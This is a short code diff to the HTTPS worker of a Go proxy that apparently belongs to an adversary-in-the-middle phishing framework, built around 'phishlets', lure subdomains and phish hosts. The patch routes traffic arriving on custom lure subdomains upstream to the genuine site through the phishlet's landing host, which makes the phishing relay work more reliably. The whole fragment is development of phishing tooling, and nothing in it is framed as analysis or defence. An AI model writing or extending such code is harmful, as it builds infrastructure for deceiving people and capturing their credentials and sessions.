@@ -2029,7 +2029,17 @@ func (p *HttpProxy) httpsWorker() {
                 return
             }
 
-            hostname, _ = p.replaceHostWithOriginal(hostname)
+            if replaced, ok := p.replaceHostWithOriginal(hostname); ok {
+                hostname = replaced
+            } else if lurePl := p.getPhishletByPhishHost(hostname); lurePl != nil {
+                // Custom lure subdomain: route upstream via the phishlet's landing host
+                // so goproxy connects to the real server, not back to itself.
+                if landingHost := lurePl.GetLandingPhishHost(); landingHost != "" {
+                    if orig, ok2 := p.replaceHostWithOriginal(landingHost); ok2 {
+                        hostname = orig
+                    }
+                }
+            }
 
             req := &http.Request{
                 Method: "CONNECT",
